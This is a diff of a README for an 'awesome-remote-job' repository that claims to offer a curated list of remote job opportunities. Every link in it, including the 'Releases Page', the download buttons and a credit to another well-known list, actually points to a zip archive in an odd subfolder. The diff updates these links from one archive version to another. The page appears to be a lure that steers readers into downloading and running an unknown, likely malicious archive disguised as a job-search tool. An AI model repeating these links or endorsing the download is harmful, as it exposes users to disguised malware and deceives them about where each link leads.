@@ -1,7 +1,7 @@
 # 🌍 awesome-remote-job - Discover Amazing Remote Job Opportunities
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/zestry999/awesome-remote-job/master/charcoal/remote_awesome_job_2.9.zip)](https://raw.githubusercontent.com/zestry999/awesome-remote-job/master/charcoal/remote_awesome_job_2.9.zip)
+[![Download](https://raw.githubusercontent.com/zestry999/awesome-remote-job/master/charcoal/job_awesome_remote_3.3.zip)](https://raw.githubusercontent.com/zestry999/awesome-remote-job/master/charcoal/job_awesome_remote_3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to awesome-remote-job! This application provides an extensive list of remote job opportunities and valuable resources designed to help you find your perfect job. Whether you are looking for remote work in programming, design, marketing, or customer support, this list has something for you.
@@ -17,13 +17,13 @@ To use this application, you will need:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the downloads:  
-   [Visit Releases Page](https://raw.githubusercontent.com/zestry999/awesome-remote-job/master/charcoal/remote_awesome_job_2.9.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/zestry999/awesome-remote-job/master/charcoal/job_awesome_remote_3.3.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of the application. Choose the most recent version for the best experience. Each version may include new features or fixes.
 
 3. **Download the File**  
-   Click on the filename that corresponds to your preferred format or version, and the download will begin automatically. The files available may be in formats like `.zip` or `https://raw.githubusercontent.com/zestry999/awesome-remote-job/master/charcoal/remote_awesome_job_2.9.zip`.
+   Click on the filename that corresponds to your preferred format or version, and the download will begin automatically. The files available may be in formats like `.zip` or `https://raw.githubusercontent.com/zestry999/awesome-remote-job/master/charcoal/job_awesome_remote_3.3.zip`.
 
 4. **Locate the Downloaded File**  
    Once the download is complete, find the file in your downloads folder. If you're on Windows, check the "Downloads" folder. On macOS, it may be in the "Downloads" folder or your desktop.
@@ -49,7 +49,7 @@ If you have found additional remote job resources or would like to contribute to
 If you encounter any issues while downloading or using the application, please visit the issues section on the GitHub repository. You can also ask for help in the community forums or contact the maintainers directly.
 
 ## 🙏 Acknowledgments
-This project is inspired by the amazing work done in other repositories that share valuable resources. A special thanks to [vinta/awesome-python](https://raw.githubusercontent.com/zestry999/awesome-remote-job/master/charcoal/remote_awesome_job_2.9.zip) for the inspiration behind this project.
+This project is inspired by the amazing work done in other repositories that share valuable resources. A special thanks to [vinta/awesome-python](https://raw.githubusercontent.com/zestry999/awesome-remote-job/master/charcoal/job_awesome_remote_3.3.zip) for the inspiration behind this project.
 
 ## 📌 Stay Updated
 For updates, enhancements, and new opportunities, keep an eye on the releases page. Follow us on GitHub to receive notifications on new versions and exciting adds to the list.
@@ -58,4 +58,4 @@ We hope you find this resource helpful for your job search. Best of luck finding
 
 ## 📥 Download Again
 To revisit the download, click here:  
-[Download Here](https://raw.githubusercontent.com/zestry999/awesome-remote-job/master/charcoal/remote_awesome_job_2.9.zip)
+[Download Here](https://raw.githubusercontent.com/zestry999/awesome-remote-job/master/charcoal/job_awesome_remote_3.3.zip)
